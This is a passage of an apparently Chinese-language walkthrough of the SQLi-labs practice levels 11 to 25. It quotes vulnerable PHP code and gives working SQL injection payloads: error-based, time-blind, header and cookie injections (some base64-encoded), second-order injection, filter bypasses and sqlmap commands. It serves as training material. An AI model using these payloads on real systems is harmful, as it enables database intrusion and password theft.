}\r\n}\n"})}),"\n",(0,l.jsxs)(r.p,{children:["\u4e07\u80fd\u5bc6\u7801",(0,l.jsx)(r.code,{children:"1' or 1=1#"})]}),"\n",(0,l.jsx)(r.p,{children:"\u62a5\u9519\u6ce8\u5165"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"uname='+-extractvalue(1,concat(0x5c,(select+table_name+from+information_schema.tables+where+table_schema=database()+limit+3,1)))-'\n"})}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"\u67e5\u8868\u540d\r\n'+-extractvalue(1,concat(0x5c,(select+table_name+from+information_schema.tables+where+table_schema=database()+limit+3,1)))-'\r\n\r\n\u67e5\u5b57\u6bb5\u540d\r\n+-extractvalue(1,concat(0x5c,(select+column_name+from+information_schema.columns+where+table_name='users'+limit+1,1)))-'\r\n\r\n\u67e5\u5185\u5bb9\r\n'+-extractvalue(1,concat(0x5c,(select+password+from+security.users+limit+0,1)))-'\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-12-\u62a5\u9519\u6ce8\u5165",children:"less-12 \u62a5\u9519\u6ce8\u5165"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:"$uname='\"'.$uname.'\"';\r\n$passwd='\"'.$passwd.'\"'; \r\n@$sql=\"SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1\";\r\n$result=mysql_query($sql);\r\n$row = mysql_fetch_array($result);\r\nif($row)\r\n        {\r\n                echo 'Your Login name:'. $row['username'];\r\n                echo 'Your Password:' .$row['password'];\r\n        }\r\n        else  \r\n        {\r\n                print_r(mysql_error());\r\n        }\r\n}\n"})}),"\n",(0,l.jsxs)(r.p,{children:["\u95ed\u5408",(0,l.jsx)(r.code,{children:'")'})]}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:'")+-extractvalue(1,concat(0x5c,(select+table_name+from+information_schema.tables+where+table_schema=database()+limit+3,1)))-("\n'})}),"\n",(0,l.jsx)(r.h2,{id:"less-13-\u62a5\u9519\u6ce8\u5165",children:"less-13 \u62a5\u9519\u6ce8\u5165"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:"@$sql=\"SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1\";\r\n$result=mysql_query($sql);\r\n$row = mysql_fetch_array($result);\n"})}),"\n",(0,l.jsxs)(r.p,{children:["\u95ed\u5408",(0,l.jsx)(r.code,{children:"')"})]}),"\n",(0,l.jsxs)(r.p,{children:["\u4e07\u80fd\u5bc6\u7801",(0,l.jsx)(r.code,{children:"1') or ('1')=('1"})]}),"\n",(0,l.jsx)(r.p,{children:"\u62a5\u9519\u6ce8\u5165"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"')+-(updatexml(1,concat(0x7e,(select+username+from+users+limit+0,1)),0x7e),1)-('\r\n') and (updatexml(1,concat(0x7e,(select group_concat(username,password) from users),0x7e),1))#\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-14-\u62a5\u9519\u6ce8\u5165",children:"less-14 \u62a5\u9519\u6ce8\u5165"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:"$uname='\"'.$uname.'\"';\r\n\t$passwd='\"'.$passwd.'\"'; \r\n\t@$sql=\"SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1\";\r\n\t$result=mysql_query($sql);\r\n\t$row = mysql_fetch_array($result);\n"})}),"\n",(0,l.jsxs)(r.p,{children:["\u95ed\u5408",(0,l.jsx)(r.code,{children:'"'}),",\u548c\u4e0a\u9762\u7684\u4e00\u6837"]}),"\n",(0,l.jsx)(r.h2,{id:"less-15-\u65f6\u95f4\u76f2\u6ce8",children:"less-15 \u65f6\u95f4\u76f2\u6ce8"}),"\n",(0,l.jsx)(r.p,{children:"\u65f6\u95f4\u76f2\u6ce8"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php+HTML",children:'@$sql="SELECT username, password FROM users WHERE username=\'$uname\' and password=\'$passwd\' LIMIT 0,1";\r\n$result=mysql_query($sql);\r\n$row = mysql_fetch_array($result);\r\n        if($row)\r\n        {\r\n                echo \'<font size="3" color="#0000ff">\';\r\n                echo "<br>";\r\n        }\r\n        else  \r\n        {\r\n                echo \'<font color= "#0000ff" font size="3">\';\r\n                //print_r(mysql_error());\r\n        }\n'})}),"\n",(0,l.jsx)(r.p,{children:"sqlmap"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"sqlmap -u 'http://192.168.27.14/Less-15/' --data \"uname=1&passwd=1&submit=Submit\" -p 'uname' -dbms=mysql --random-agent --flush-session --technique=T\n"})}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"sqlmap -u 'http://192.168.27.14/Less-15/' --forms -p 'uname' -dbms=mysql --random-agent --flush-session --technique=T\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-16-\u65f6\u95f4\u76f2\u6ce8",children:"less-16 \u65f6\u95f4\u76f2\u6ce8"}),"\n",(0,l.jsx)(r.p,{children:"\u65f6\u95f4\u76f2\u6ce8"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:'$uname=\'"\'.$uname.\'"\';\r\n$passwd=\'"\'.$passwd.\'"\'; \r\n@$sql="SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1";\r\n$result=mysql_query($sql);\r\n$row = mysql_fetch_array($result);\r\nif($row)\r\n        {\r\n                echo "<br>";\r\n                echo \'<font color= "#FFFF00" font size = 4>\';\r\n                echo "<br>";\r\n        }\r\n        else  \r\n        {\r\n                echo \'<font color= "#0000ff" font size="3">\';\r\n                echo "</br>";\r\n                echo "</br>";\r\n        }\n'})}),"\n",(0,l.jsxs)(r.p,{children:[(0,l.jsx)(r.code,{children:'"'}),"\u95ed\u5408"]}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:'1"+and+(select+1+from+(select(sleep(2)))aa)+and+"1"="1\n'})}),"\n",(0,l.jsx)(r.h2,{id:"less-17-update-\u62a5\u9519\u6ce8\u5165",children:"less-17 update \u62a5\u9519\u6ce8\u5165"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:"function check_input($value)\r\n        {\r\n        if(!empty($value))\r\n                {\r\n                // truncation (see comments)\r\n                $value = substr($value,0,15);\r\n                }\r\n\r\n                // Stripslashes if magic quotes enabled\r\n                if (get_magic_quotes_gpc())\r\n                        {\r\n                        $value = stripslashes($value);\r\n                        }\r\n\r\n                // Quote if not a number\r\n                if (!ctype_digit($value))\r\n                        {\r\n                        $value = \"'\" . mysql_real_escape_string($value) . \"'\";\r\n                        }\r\n\r\n        else\r\n                {\r\n                $value = intval($value);\r\n                }\r\n        return $value;\r\n        }\r\n\r\n// take the variables\r\nif(isset($_POST['uname']) && isset($_POST['passwd']))\r\n\r\n{\r\n//making sure uname is not injectable\r\n$uname=check_input($_POST['uname']);  \r\n$passwd=$_POST['passwd'];\r\n\r\n\r\n//logging the connection parameters to a file for analysis.\r\n$fp=fopen('result.txt','a');\r\nfwrite($fp,'User Name:'.$uname.\"\\n\");\r\nfwrite($fp,'New Password:'.$passwd.\"\\n\");\r\nfclose($fp);\r\n\r\n// connectivity \r\n@$sql=\"SELECT username, password FROM users WHERE username= $uname LIMIT 0,1\";\r\n$result=mysql_query($sql);\r\n$row = mysql_fetch_array($result);\r\n        if($row)\r\n        {\r\n                $row1 = $row['username'];  \r\n                $update=\"UPDATE users SET password = '$passwd' WHERE username='$row1'\";\r\n                mysql_query($update);\r\n                if (mysql_error())\r\n                {\r\n                        print_r(mysql_error());\r\n                }\r\n                else\r\n                {\r\n                        //echo \" You password has been successfully updated \" ;\r\n                        echo \"<br>\";\r\n                }\r\n                echo \"</font>\";\r\n        }\r\n        else  \r\n        {\r\n                echo '<font size=\"4.5\" color=\"#FFFF00\">';\r\n                //echo \"Bug off you Silly Dumb hacker\";\r\n        }\r\n}\n"})}),"\n",(0,l.jsx)(r.p,{children:"\u62a5\u9519\u6ce8\u5165"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"\u5728SQL\u6ce8\u5165\u653b\u51fb\u8fc7\u7a0b\u4e2d\uff0c\u670d\u52a1\u5668\u5f00\u542f\u4e86\u9519\u8bef\u56de\u663e\uff0c\u9875\u9762\u4f1a\u8fd4\u56de\u9519\u8bef\u4fe1\u606f\uff0c\u5229\u7528\u62a5\u9519\u51fd\u6570\u83b7\u53d6\u6570\u636e\u5e93\u6570\u636e\u3002\r\n\r\n\u5e38\u7528\u7684MySQL\u62a5\u9519\u51fd\u6570\r\n\r\n--xpath\u8bed\u6cd5\u9519\u8bef\r\nextractvalue()\t--\u67e5\u8be2\u8282\u70b9\u5185\u5bb9\uff0c\u63a5\u6536\u4e24\u4e2a\u53c2\u6570\uff0c\u62a5\u9519\u4f4d\u7f6e\u5728\u7b2c\u4e8c\u4e2a\u53c2\u6570\r\nupdatexml()\t\t--\u4fee\u6539\u67e5\u8be2\u5230\u7684\u5185\u5bb9\uff0c\u63a5\u6536\u4e09\u4e2a\u53c2\u6570\uff0c\u62a5\u9519\u4f4d\u7f6e\u5728\u7b2c\u4e8c\u4e2a\u53c2\u6570\r\n\u5b83\u4eec\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u90fd\u8981\u6c42\u662f\u7b26\u5408xpath\u8bed\u6cd5\u7684\u5b57\u7b26\u4e32\r\n\u5982\u679c\u4e0d\u6ee1\u8db3\u8981\u6c42\u5219\u4f1a\u62a5\u9519\uff0c\u5e76\u4e14\u5c06\u67e5\u8be2\u7ed3\u679c\u653e\u5728\u62a5\u9519\u4fe1\u606f\u91cc\r\n\r\n--\u4e3b\u952e\u91cd\u590d\uff08duplicate entry\uff09\r\nfloor()\t\t\t--\u8fd4\u56de\u5c0f\u4e8e\u7b49\u4e8e\u8be5\u503c\u7684\u6700\u5927\u6574\u6570\r\n\u53ea\u8981\u662fcount\uff0crand()\uff0cgroup by \u4e09\u4e2a\u8fde\u7528\u5c31\u4f1a\u9020\u6210\u8fd9\u79cd\u4e3b\u952e\u91cd\u590d\u62a5\u9519\n"})}),"\n",(0,l.jsx)(r.p,{children:(0,l.jsx)(r.a,{href:"https://blog.csdn.net/weixin_54217950/article/details/122938063",children:"\u62a5\u9519\u51fd\u6570"})}),"\n",(0,l.jsx)(r.p,{children:(0,l.jsx)(r.strong,{children:"\u67e5\u8868"})}),"\n",(0,l.jsx)(r.p,{children:"floor\u51fd\u6570"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"or (select 1 from (select count(*),concat(0x7e,(),0x7e,floor(rand(0)*2))x from information_schema.tables group by x)a)--+\n"})}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"'or+(select+1+from+(select+count(*),concat(0x7e,(select+table_name+from+information_schema.tables+where+table_schema=database()+limit+3,1),0x7e,floor(rand(0)*2))x+from+information_schema.tables+group+by+x)a)--+\n"})}),"\n",(0,l.jsx)(r.p,{children:"extractvalue\u51fd\u6570"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"'and+extractvalue(1,concat(0x7e,(select+table_name+from+information_schema.tables+where+table_schema=database()+limit+3,1),0x7e))\n"})}),"\n",(0,l.jsx)(r.p,{children:"updatexml\u51fd\u6570"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"'and+updatexml(1,concat(0x7e,(select+table_name+from+information_schema.tables+where+table_schema=database()+limit+3,1),0x7e),1)--+\n"})}),"\n",(0,l.jsx)(r.p,{children:"\u67e5\u5217"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"'and+updatexml(1,concat(0x7e,(select+username+from++users++limit+1,1),0x7e),1)--+\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-18-ua-\u62a5\u9519\u6ce8\u5165",children:"less-18 UA \u62a5\u9519\u6ce8\u5165"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:"$uagent = $_SERVER['HTTP_USER_AGENT'];\r\n        $IP = $_SERVER['REMOTE_ADDR'];\r\n        echo \"<br>\";\r\n        echo 'Your IP ADDRESS is: ' .$IP;\r\n        echo \"<br>\";\r\n        //echo 'Your User Agent is: ' .$uagent;\r\n// take the variables\r\nif(isset($_POST['uname']) && isset($_POST['passwd']))\r\n        {\r\n        $uname = check_input($_POST['uname']);\r\n        $passwd = check_input($_POST['passwd']);\r\n        /*\r\n        echo 'Your Your User name:'. $uname;\r\n        echo \"<br>\";\r\n        echo 'Your Password:'. $passwd;\r\n        echo \"<br>\";\r\n        echo 'Your User Agent String:'. $uagent;\r\n        echo \"<br>\";\r\n        echo 'Your User Agent String:'. $IP;\r\n        */\r\n$sql=\"SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1\";\r\n$result1 = mysql_query($sql);\r\n$row1 = mysql_fetch_array($result1);\r\n                if($row1)\r\n                        {\r\n                        echo '<font color= \"#FFFF00\" font size = 3 >';\r\n                        $insert=\"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)\";\r\n                        mysql_query($insert);\r\n                        echo '<font color= \"#0000ff\" font size = 3 >';\r\n                        echo 'Your User Agent is: ' .$uagent;\r\n                        print_r(mysql_error());\r\n                        }\r\n                else\r\n                        {\r\n                        print_r(mysql_error());  \r\n                        }\r\n}\n"})}),"\n",(0,l.jsx)(r.p,{children:"ua\u5934\u6ce8\u5165"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-http",children:"POST /Less-18/ HTTP/1.1\r\nHost: 192.168.27.14\r\nUser-Agent: 1' and updatexml(1,concat(0x7e,user(),0x7e),1) and '1'='1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 30\r\n\r\nuname=Dumb&passwd=0&submit=Submit\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-19-referer-\u62a5\u9519\u6ce8\u5165",children:"less-19 Referer \u62a5\u9519\u6ce8\u5165"}),"\n",(0,l.jsx)(r.p,{children:"\u548c\u4e0a\u9762\u4e00\u6837\u7684\uff0c\u6362\u4e86\u4e2ahttp\u5934"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-http",children:"POST http://192.168.27.14/Less-19/ HTTP/1.1\r\nHost: 192.168.27.14\r\nContent-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36\r\nReferer: ' and updatexml(1,concat(0x7e,user()),1) and '1'='1\r\nConnection: keep-alive\r\nContent-Length: 33\r\n\r\nuname=Dumb&passwd=0&submit=Submit\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-20-cookie-\u62a5\u9519\u6ce8\u5165",children:"less-20 cookie \u62a5\u9519\u6ce8\u5165"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:"$cookee = $_COOKIE['uname'];\r\n$sql=\"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1\";\r\n$result=mysql_query($sql);\r\nif (!$result)\r\n        {\r\n        die('Issue with your mysql: ' . mysql_error());\r\n        }\r\n$row = mysql_fetch_array($result);\r\nif($row)\r\n        {\r\n        echo '<font color= \"pink\" font size=\"5\">';\r\n        echo 'Your Login name:'. $row['username'];\r\n        echo \"<br>\";\r\n        echo '<font color= \"grey\" font size=\"5\">';  \r\n        echo 'Your Password:' .$row['password'];\r\n        echo \"</font></b>\";\r\n        echo \"<br>\";\r\n        echo 'Your ID:' .$row['id'];\r\n        }\r\nelse\r\n        {\r\n        echo \"<center>\";\r\n        echo '<br><br><br>';\r\n        echo '<img src=\"../images/slap1.jpg\" />';\r\n        echo \"<br><br><b>\";\r\n        //echo '<img src=\"../images/Less-20.jpg\" />';\r\n        }\n"})}),"\n",(0,l.jsx)(r.p,{children:"\u548c\u4e0a\u9762\u4e00\u6837\u7684\uff0c\u6362\u6210cookie\u4e86"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-http",children:"GET /Less-20/index.php HTTP/1.1\r\nHost: 192.168.27.14\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36\r\nCookie: uname=Dumb'- updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1)-'\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-21-cookie-base64-\u62a5\u9519\u6ce8\u5165",children:"less-21 cookie base64 \u62a5\u9519\u6ce8\u5165"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:"$cookee = $_COOKIE['uname'];\r\n$cookee = base64_decode($cookee);\r\necho \"<br></font>\";\r\n$sql=\"SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1\";\r\n$result=mysql_query($sql);\r\nif (!$result)\r\n        {\r\n        die('Issue with your mysql: ' . mysql_error());\r\n        }\r\n$row = mysql_fetch_array($result);\r\nif($row)\r\n        {\r\n        echo '<font color= \"pink\" font size=\"5\">';\r\n        echo 'Your Login name:'. $row['username'];\r\n        echo \"<br>\";\r\n        echo '<font color= \"grey\" font size=\"5\">';  \r\n        echo 'Your Password:' .$row['password'];\r\n        echo \"</font></b>\";\r\n        echo \"<br>\";\r\n        echo 'Your ID:' .$row['id'];\r\n        }\n"})}),"\n",(0,l.jsx)(r.p,{children:(0,l.jsx)(r.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241206154956021.png",alt:"image-20241206154956021"})}),"\n",(0,l.jsx)(r.p,{children:"\u5c06\u4e0a\u4e00\u9898\u7684payload\u8fdb\u884cbase64\u7f16\u7801\u5373\u53ef"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-http",children:"GET /Less-21/index.php HTTP/1.1\r\nHost: 192.168.27.14\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36\r\nCookie: uname=RHVtYictIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgcGFzc3dvcmQgZnJvbSB1c2VycyBsaW1pdCAwLDEpLDB4N2UpLDEpLSc=\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-22-cookie-base64",children:"less-22 cookie base64"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:"$cookee = base64_decode($cookee);\r\n$cookee1 = '\"'. $cookee. '\"';\r\necho \"<br></font>\";\r\n$sql=\"SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1\";\r\n$result=mysql_query($sql);\r\nif (!$result)\r\n{\r\n\tdie('Issue with your mysql: ' . mysql_error());\r\n}\r\n$row = mysql_fetch_array($result);\n"})}),"\n",(0,l.jsx)(r.p,{children:"\u53cc\u5f15\u53f7\u95ed\u5408\uff0c\u5728base64\u7f16\u7801"}),"\n",(0,l.jsx)(r.p,{children:"payload"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"RHVtYiItIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgcGFzc3dvcmQgZnJvbSB1c2VycyBsaW1pdCAwLDEpLDB4N2UpLDEpLSI=\n"})}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-http",children:"GET /Less-22/index.php HTTP/1.1\r\nHost: 192.168.27.14\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36\r\nCookie: uname=RHVtYiItIHVwZGF0ZXhtbCgxLGNvbmNhdCgweDdlLChzZWxlY3QgcGFzc3dvcmQgZnJvbSB1c2VycyBsaW1pdCAwLDEpLDB4N2UpLDEpLSI=\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-23--\u5f00\u59cb\u8fc7\u6ee4-\u62a5\u9519\u6ce8\u5165",children:"less-23  \u5f00\u59cb\u8fc7\u6ee4 \u62a5\u9519\u6ce8\u5165"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:'$id=$_GET[\'id\'];\r\n\r\n//filter the comments out so as to comments should not work\r\n$reg = "/#/";\r\n$reg1 = "/--/";\r\n$replace = "";\r\n$id = preg_replace($reg, $replace, $id);\r\n$id = preg_replace($reg1, $replace, $id);\r\n\r\n// connectivity \r\n$sql="SELECT * FROM users WHERE id=\'$id\' LIMIT 0,1";\r\n$result=mysql_query($sql);\r\n$row = mysql_fetch_array($result);\r\n\r\n        if($row)\r\n        {\r\n        echo \'<font color= "#0000ff">\';\r\n        echo \'Your Login name:\'. $row[\'username\'];\r\n        echo "<br>";\r\n        echo \'Your Password:\' .$row[\'password\'];\r\n        echo "</font>";\r\n        }\r\n        else \r\n        {\r\n        echo \'<font color= "#FFFF00">\';\r\n        print_r(mysql_error());\r\n        echo "</font>";  \r\n        }\r\n}\r\n        else { echo "Please input the ID as parameter with numeric value";}\n'})}),"\n",(0,l.jsxs)(r.p,{children:["\u8fc7\u6ee4",(0,l.jsx)(r.code,{children:"#"}),"\uff0c",(0,l.jsx)(r.code,{children:"--"})]}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"1'-updatexml(1,concat(0x7e,(select+username+from++users++limit+0,1),0x7e),1)+and+'1'='1\n"})}),"\n",(0,l.jsx)(r.h2,{id:"less-24-\u4e8c\u6b21\u6ce8\u5165",children:"less-24 \u4e8c\u6b21\u6ce8\u5165"}),"\n",(0,l.jsx)(r.p,{children:(0,l.jsx)(r.code,{children:"login.php"})}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:"function sqllogin(){\r\n   $username = mysql_real_escape_string($_POST[\"login_user\"]);\r\n   $password = mysql_real_escape_string($_POST[\"login_password\"]);\r\n   $sql = \"SELECT * FROM users WHERE username='$username' and password='$password'\";\r\n//$sql = \"SELECT COUNT(*) FROM users WHERE username='$username' and password='$password'\";\r\n   $res = mysql_query($sql) or die('You tried to be real smart, Try harder!!!! :( ');\r\n   $row = mysql_fetch_row($res);\r\n        //print_r($row) ;\r\n   if ($row[1]) {\r\n\t\treturn $row[1];\r\n   } else {\r\n\t\treturn 0;\r\n   }\r\n}\n"})}),"\n",(0,l.jsxs)(r.p,{children:["\u767b\u5f55\u53e3\u6709",(0,l.jsx)(r.code,{children:"mysql_real_escape_string"}),"\u51fd\u6570"]}),"\n",(0,l.jsx)(r.p,{children:"\u8be5\u51fd\u6570\u5bf9\u7279\u6b8a\u5b57\u7b26\u8fdb\u884c\u8f6c\u4e49\uff0c\u4e0d\u80fd\u8fdb\u884c\u6ce8\u5165"}),"\n",(0,l.jsx)(r.p,{children:(0,l.jsx)(r.code,{children:"new_user.php"})}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:'if ($pass==$re_pass)\r\n{\r\n    # Building up the query........\r\n    $sql = "insert into users ( username, password) values(\\"$username\\", \\"$pass\\")";\r\n    mysql_query($sql) or die(\'Error Creating your user account,  : \'.mysql_error());\r\n    echo "</br>";\r\n    echo "<center><img src=../images/Less-24-user-created.jpg><font size=\'3\' color=\'#FFFF00\'>";   \r\n    //echo "<h1>User Created Successfully</h1>";\r\n    echo "</br>";\r\n    echo "</br>";\r\n    echo "</br>";\r\n    echo "</br>Redirecting you to login page in 5 sec................";\r\n    echo "<font size=\'2\'>";\r\n    echo "</br>If it does not redirect, click the home button on top right</center>";\r\n    header(\'refresh:5, url=index.php\');\r\n}\n'})}),"\n",(0,l.jsx)(r.p,{children:"\u63d2\u5165"}),"\n",(0,l.jsx)(r.p,{children:"\u521b\u5efa\u7528\u6237\u754c\u9762\uff0c\u521b\u5efa\u7528\u6237\u540e\u767b\u5f55"}),"\n",(0,l.jsx)(r.p,{children:(0,l.jsx)(r.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241207194307801.png",alt:"image-20241207194307801"})}),"\n",(0,l.jsx)(r.p,{children:"\u53d1\u73b0\u56de\u663e\u4e86\u7528\u6237\u540d\uff0c\u4f46\u662f\u56de\u663e\u7684\u7528\u6237\u540d\u4e2d\u7684\u7279\u6b8a\u5b57\u7b26\u5e76\u6ca1\u6709\u88ab\u8f6c\u4e49\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u4e8c\u6b21\u6ce8\u5165"}),"\n",(0,l.jsx)(r.p,{children:"\u5bfb\u627e\u53ef\u4ee5\u5f15\u7528\u8fd9\u4e2a\u7528\u6237\u540d\u7684\u529f\u80fd\u70b9\uff0c\u4fee\u6539\u5bc6\u7801\u5c31\u53ef\u4ee5"}),"\n",(0,l.jsxs)(r.p,{children:["\u6211\u4eec\u4fee\u6539",(0,l.jsx)(r.code,{children:"admin' #"}),"\u7528\u6237\u7684\u5bc6\u7801\uff0c\u4f46\u662f\u771f\u5b9e\u4fee\u6539\u7684\u5374\u662fadmin\u7684\u5bc6\u7801"]}),"\n",(0,l.jsx)(r.p,{children:"\u4fee\u6539\u5bc6\u7801"}),"\n",(0,l.jsx)(r.p,{children:(0,l.jsx)(r.code,{children:"pass_change.php"})}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:"if (isset($_POST['submit']))\r\n{\r\n        # Validating the user input........\r\n        $username= $_SESSION[\"username\"];\r\n        $curr_pass= mysql_real_escape_string($_POST['current_password']);\r\n        $pass= mysql_real_escape_string($_POST['password']);\r\n        $re_pass= mysql_real_escape_string($_POST['re_password']);\r\n\r\n        if($pass==$re_pass)\r\n        {\r\n                $sql = \"UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' \";\r\n                $res = mysql_query($sql) or die('You tried to be smart, Try harder!!!! :( ');\r\n                $row = mysql_affected_rows();\r\n                echo '<font size=\"3\" color=\"#FFFF00\">';\r\n                echo '<center>';\r\n                if($row==1)\r\n                {\r\n                        echo \"Password successfully updated\";\r\n                }\r\n                else\r\n                {\r\n                        header('Location: failed.php');\r\n                        //echo 'You tried to be smart, Try harder!!!! :( ';\r\n                }\r\n}\n"})}),"\n",(0,l.jsxs)(r.p,{children:["\u8fd9\u91ccusername\u662f\u76f4\u63a5\u53d6\u51fa\u6765\u7684\uff0c\u6ca1\u6709\u505a\u4ec0\u4e48\u8f6c\u4e49",(0,l.jsx)(r.code,{children:'$username= $_SESSION["username"];'})]}),"\n",(0,l.jsxs)(r.p,{children:["\u90a3\u4e48\uff0c\u6211\u4eec\u7684payload",(0,l.jsx)(r.code,{children:"admin' #"}),",\u653e\u5165\u8bed\u53e5"]}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"UPDATE users SET PASSWORD='$pass' where username='admin' #' and password='$curr_pass'\n"})}),"\n",(0,l.jsx)(r.p,{children:"\u8fd9\u6837\u5c31\u9020\u6210\u4e86\u4e8c\u6b21\u6ce8\u5165"}),"\n",(0,l.jsx)(r.p,{children:"\u6f0f\u6d1e\u539f\u56e0\uff1a\u63d2\u5165\u6570\u636e\u5e93\u91cc\u7684\u810f\u6570\u636e\u5e76\u6ca1\u6709\u505a\u8f6c\u4e49\uff0c\u8fc7\u6ee4\u5c31\u62ff\u51fa\u6765\u76f4\u63a5\u7528\uff0c\u5bfc\u81f4\u4e8c\u6b21\u6ce8\u5165"}),"\n",(0,l.jsx)(r.p,{children:(0,l.jsx)(r.img,{src:"https://dabai1-1316520326.cos.ap-shanghai.myqcloud.com/img/image-20241207195150260.png",alt:"image-20241207195150260"})}),"\n",(0,l.jsx)(r.h2,{id:"less-25-\u8fc7\u6ee4-or-and",children:"less-25 \u8fc7\u6ee4 or and"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{className:"language-php",children:"function blacklist($id)\r\n{\r\n\t$id= preg_replace('/or/i',\"\", $id); //strip out OR (non case sensitive)\r\n\t$id= preg_replace('/AND/i',\"\", $id); //Strip out AND (non case sensitive)\r\n\treturn $id;\r\n}\n"})}),"\n",(0,l.jsxs)(r.p,{children:["\u8fc7\u6ee4\u4e86",(0,l.jsx)(r.code,{children:"or"}),",",(0,l.jsx)(r.code,{children:"and"}),"\uff0c\u4f1a\u5c06\u8fd9\u4e24\u66ff\u6362\u4e3a\u7a7a\uff0c\u53cc\u5199\u7ed5\u8fc7"]}),"\n",(0,l.jsx)(r.p,{children:"\u7b26\u53f7\u66ff\u6362"}),"\n",(0,l.jsx)(r.pre,{children:(0,l.jsx)(r.code,{children:"or -> ||\r\nand -> 